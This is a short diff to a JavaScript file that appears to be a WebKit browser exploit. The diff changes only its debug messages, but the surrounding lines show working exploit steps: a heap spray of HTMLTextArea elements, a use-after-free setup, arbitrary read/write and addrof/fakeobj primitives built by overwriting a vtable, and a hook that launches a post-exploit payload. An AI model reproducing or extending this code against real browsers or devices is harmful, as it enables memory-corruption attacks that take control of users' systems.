@@ -70,7 +70,7 @@ function setupRW() {
 	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
 	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
-	debug_log("[+] Webkit Exploit Finished Successfully");
+	debug_log("[+] Succesfully got arbitrary R/W!");
 	write64(guess_htmltextarea_addr, saved_vtable);
 	cleanup();
 	g_ab_slave.leakme = 0x1337;
@@ -80,7 +80,7 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("[+] Launching Payload, Wait 20 Seconds...");
+	debug_log("[+] Succesfully got addrof/fakeobj");
 	if(window.postExploit)
 		window.postExploit();
 }
@@ -275,7 +275,7 @@ function prepareUAF() {
 	g_input.autofocus = true;
 }
 function sprayHTMLTextArea() {
-	debug_log("[+] Running Webkit Exploit ...");
+	debug_log("[+] Spraying HTMLTextareaElement ...");
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
